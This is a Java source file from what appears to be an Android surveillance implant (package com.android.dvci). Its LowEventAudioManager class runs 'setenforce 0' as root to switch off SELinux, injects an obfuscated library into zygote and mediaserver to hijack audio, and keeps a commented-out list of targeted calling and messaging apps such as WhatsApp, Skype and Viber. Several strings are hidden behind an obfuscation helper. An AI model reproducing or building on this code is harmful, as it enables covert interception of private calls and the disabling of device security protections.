package com.android.dvci.listener;

import com.android.dvci.ProcessInfo;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.message.LowEventAudio;

import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.LowEventMsg;

import com.android.mm.M;

import java.util.HashMap;

/**
 * Created by zad on 15/06/15.
 */
public class LowEventAudioManager extends Listener<LowEventAudio> implements Observer<LowEventMsg> {
	//
	private static final String TAG = "LowEventAudioManager";

	private volatile static LowEventAudioManager singleton;
	Instrument hijack =null;
	private Observer<ProcessInfo> processObserver;


	private LowEventAudioManager() {
		super();

	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventAudioManager self() {
		if (singleton == null) {
			synchronized (LowEventAudioManager.class) {
				if (singleton == null) {
					singleton = new LowEventAudioManager();
				}
			}
		}
		return singleton;
	}
	/*
	public synchronized void addBlacklist(String black) {
		hijacks.put(black, null);
	}
	public synchronized void delBlacklist(String black) {
		hijacks.remove(black);
	}
	public synchronized boolean inInBlacklist(String process) {
		return hijacks.containsKey(process);
	}

	public synchronized void resetBlacklist() {
		//blacklist.clear();
		addBlacklist(M.e("shazam"));
		addBlacklist(M.e("com.vlingo"));
		addBlacklist(M.e("soundrecorder"));
		addBlacklist(M.e("voicerecorder"));
		addBlacklist(M.e("voicesearch"));
		addBlacklist(M.e("com.andrwq.recorder"));
		addBlacklist(M.e("com.skype.raider"));
		addBlacklist(M.e("com.viber.voip"));
		addBlacklist(M.e("com.whatsapp"));
		addBlacklist(M.e("com.facebook.katana"));
		addBlacklist(M.e("com.facebook.orca"));
		addBlacklist(M.e("com.tencent.mm"));
		addBlacklist(M.e("jp.naver.line.android"));
		addBlacklist(M.e("com.google.android.talk"));
		if (Utils.isSpeechRecognitionActivityPresent()) {
			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(resetBlacklist)voice Recognition not present");//$NON-NLS-1$
			}
		}
	}
	private boolean isForegroundBlacklist() {

		String foreground = Status.self().getForeground();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isForegroundBlacklist) checking \""+foreground+"\'");
		}
		for (String bl : hijacks.keySet()) {
			if (foreground.contains(bl)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
				}
				return true;
			}
		}
		return false;
	}

	@Override
	public void notifyProcess(ProcessInfo b) {
		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		boolean headset = audioManager.isWiredHeadsetOn();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyProcess) headset: " + headset);
		}
		isForegroundBlacklist();
		if(!hijacks.isEmpty() && hijacks.containsKey(b.processInfo)) {
			Instrument hijack = null;
			if (hijacks.get(b.processInfo) == null) {
				String lib = M.e("pa.data");
				if (android.os.Build.VERSION.SDK_INT > 20) {
					lib = M.e("paL.data");
					Execute.executeRoot(M.e("setenforce 0"));
				}

				hijack = new Instrument(b.processInfo, Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, lib);
				hijack.setInstrumentationSuccessDir(Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), true);
				hijack.addArg(Status.getApkName());
				hijack.addArg(M.e("mediaserver"));
				hijacks.put(b.processInfo,hijack);
			}else{
				hijack = hijacks.get(b.processInfo);
			}
			if(!hijack.isStarted()) {
				hijack.start();
			}
		}

	}
*/
	@Override
	public void start() {
		LowEventHandlerManager.self().attach(this);
		if(hijack == null) {
			String lib = M.e("pa.data");
			if (android.os.Build.VERSION.SDK_INT > 20) {
				lib = M.e("paL.data");
				Execute.executeRoot(M.e("setenforce 0"));
			}
			hijack = new Instrument(M.e("zygote"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, lib);
			hijack.setInstrumentationSuccessDir(Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), true);
			hijack.addArg(Status.getApkName());
			hijack.addArg("mediaserver");
		}
		hijack.start();

	}

	@Override
	public void stop() {
			if(hijack != null) {
				hijack.stop();
			}
		LowEventHandlerManager.self().detach(this);
	}
	@Override
	public synchronized boolean attach(Observer<LowEventAudio> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<LowEventAudio> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}


	@Override
	public int notification(LowEventMsg event) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " notification");//$NON-NLS-1$
		}
		if (event.data != null) {
			dispatch(new LowEventAudio(event));
		}
		event.res = 1;
		return event.res;
	}
	public boolean isInstrumented(){
		return hijack!=null && hijack.isStarted();
	}
}
